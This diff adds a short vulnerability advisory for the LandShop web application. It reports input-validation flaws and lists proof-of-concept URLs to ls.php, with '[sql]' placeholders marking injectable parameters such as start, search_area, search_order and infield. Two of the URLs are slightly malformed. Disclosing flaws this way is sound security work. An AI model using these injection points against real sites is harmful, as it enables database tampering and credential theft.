@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/20989/info
+ 
+LandShop is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied input data.
+ 
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, access or modify sensitive data, execute arbitrary script code in the context of the application, compromise the application, and possibly exploit latent vulnerabilities in the underlying system; other attacks are also possible.
+ 
+http://www.example.com/PATH/action/ls.php?lang=en&action=list&start=[sql] 
+http://www.example.com/PATH/action/ls.php?lang=en&action=list&start=0&CAT_ID=1&keyword=&search_area=[sql] http://www.example.com/PATH/action/ls.php?lang=en&action=list&start=0&CAT_ID=1&keyword=&search_area=&search_type=[sql] http://www.example.com/PATH/action/ls.phplang=en&action=list&start=20&CAT_ID=1&keyword=&search_area=&search_type=&search_order=[sql] 
+http://www.example.com/PATH/action/ls.phpvariables =/PATH/action/ls.php?lang=en&action=list&CAT_ID=1&keyword=1&infield=[sql]
